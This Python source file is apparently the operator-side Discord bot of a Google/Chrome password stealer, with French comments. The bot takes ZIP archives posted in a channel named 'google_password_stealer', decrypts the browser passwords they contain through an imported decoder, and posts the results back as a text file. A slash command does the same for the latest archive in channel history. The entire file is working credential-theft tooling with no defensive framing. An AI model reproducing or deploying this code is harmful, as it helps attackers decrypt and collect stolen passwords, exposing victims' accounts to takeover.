import discord
import os
import shutil
import tempfile
import main as decoder
from keep_alives import keep_alive
from dotenv import load_dotenv
from discord.ext import commands

intents = discord.Intents.all()

# Utiliser `commands.Bot` uniquement
client = commands.Bot(command_prefix="/", intents=intents)

load_dotenv(dotenv_path="config")


@client.event
async def on_message(message):
    if message.channel.name == "google_password_stealer":
        for attachment in message.attachments:
            if attachment.filename.endswith('.zip'):
                path_to_decrypt = os.path.abspath(attachment.filename)
                print(f"Téléchargement de {attachment.filename}...")
                await attachment.save(path_to_decrypt)
                tableau = decoder.decrypt_passwords(path_to_decrypt)
                tableau_str = tableau.get_string()
                output_file = "resultats.txt"
                with open(output_file, "w") as f:
                    f.write(tableau_str)
                await message.channel.send("Voici le fichier contenant les résultats :", file=discord.File(output_file))
                os.remove(output_file)
                try:
                    shutil.rmtree("extracted_files")
                except PermissionError as e:
                    print(f"Erreur de permission : {e}")
                except Exception as e:
                    print(f"Erreur inattendue lors de la suppression du dossier : {e}")

                os.remove(path_to_decrypt)
                print("Analyse et nettoyage terminés.")
                break

    # Process commands si `on_message` est redéfini
    await client.process_commands(message)


@client.tree.command(
    name="decrypt_file",
    description="Déchiffre le dernier fichier ZIP contenant des mots de passe et génère un fichier texte avec les résultats."
)
async def decrypt_file(interaction: discord.Interaction):
    await interaction.response.defer()  # Indique que la commande est en cours de traitement

    async for message in interaction.channel.history(limit=None):  # Parcourt tous les messages
        for attachment in message.attachments:
            if attachment.filename.endswith('.zip'):
                with tempfile.TemporaryDirectory() as temp_dir:
                    path_to_decrypt = os.path.join(temp_dir, attachment.filename)
                    print(f"Téléchargement de {attachment.filename}...")
                    await attachment.save(path_to_decrypt)

                    tableau = decoder.decrypt_passwords(path_to_decrypt)
                    tableau_str = tableau.get_string()
                    output_file = os.path.join(temp_dir, "resultats.txt")

                    with open(output_file, "w") as f:
                        f.write(tableau_str)

                    await interaction.followup.send(
                        "Voici le fichier contenant les résultats :",
                        file=discord.File(output_file)
                    )
                    print("Analyse et nettoyage terminés.")
                return  # Arrête la recherche après avoir trouvé et traité un fichier ZIP

    # Si aucun fichier ZIP n'a été trouvé
    await interaction.followup.send("Aucun fichier ZIP trouvé dans l'historique des messages.")


@client.event
async def on_ready():
    print(f'Connecté en tant que {client.user}')
    try:
        # Synchroniser les commandes avec Discord
        await client.tree.sync()
        print(f"{len(client.commands)} commandes synchronisées")
    except Exception as e:
        print(f"Erreur lors de la synchronisation des commandes : {e}")


def start_bot():
    keep_alive()
    client.run(os.getenv("DISCORD_TOKEN"))


if __name__ == "__main__":
    start_bot()
